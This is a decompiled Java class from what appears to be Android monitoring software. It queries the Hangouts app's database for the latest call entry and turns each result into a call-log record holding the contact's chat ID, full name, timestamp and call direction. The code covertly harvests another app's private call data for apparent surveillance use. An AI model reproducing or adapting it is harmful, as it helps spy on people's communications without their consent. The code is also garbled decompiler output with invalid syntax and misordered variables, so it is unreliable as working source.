package com.vvt.capture.hangouts;

import android.database.Cursor;
import com.vvt.ak.a;
import com.vvt.im.events.info.ICallLogData.Direction;
import com.vvt.im.events.info.ICallLogData.IsMonitor;
import java.util.ArrayList;

public class b
{
  private static final boolean a = a.a;
  
  public static String a()
  {
    return "SELECT messages._id,  messages.author_chat_id, participants.full_name, messages.timestamp FROM conversation_participants INNER JOIN participants ON participant_row_id = participants._id INNER JOIN messages ON messages.conversation_id = conversation_participants.conversation_id WHERE type = 8 ORDER BY timestamp DESC LIMIT 1";
  }
  
  public static ArrayList a(Cursor paramCursor, String paramString)
  {
    long l1 = 0L;
    boolean bool1 = a;
    if (bool1) {}
    ArrayList localArrayList = new java/util/ArrayList;
    localArrayList.<init>();
    bool1 = paramCursor.moveToNext();
    if (bool1)
    {
      Object localObject = "timestamp";
      int i = paramCursor.getColumnIndex((String)localObject);
      long l2 = paramCursor.getLong(i);
      boolean bool3 = l2 < l1;
      if (bool3)
      {
        long l3 = 1000L;
        l2 /= l3;
      }
      int j = paramCursor.getColumnIndex("author_chat_id");
      String str1 = paramCursor.getString(j);
      int k = paramCursor.getColumnIndex("full_name");
      String str2 = paramCursor.getString(k);
      c localc = new com/vvt/capture/hangouts/c;
      localc.<init>();
      localc.a(l2);
      bool2 = str1.equalsIgnoreCase(paramString);
      if (bool2)
      {
        localObject = ICallLogData.Direction.OUT;
        localc.a((ICallLogData.Direction)localObject);
      }
      for (;;)
      {
        localc.b(l1);
        localc.a(str1);
        localc.b(str2);
        localc.a(0);
        localObject = ICallLogData.IsMonitor.NO;
        localc.a((ICallLogData.IsMonitor)localObject);
        localc.b(0);
        localArrayList.add(localc);
        break;
        localObject = ICallLogData.Direction.IN;
        localc.a((ICallLogData.Direction)localObject);
      }
    }
    boolean bool2 = a;
    if (bool2) {}
    return localArrayList;
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/capture/hangouts/removeFromPath.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */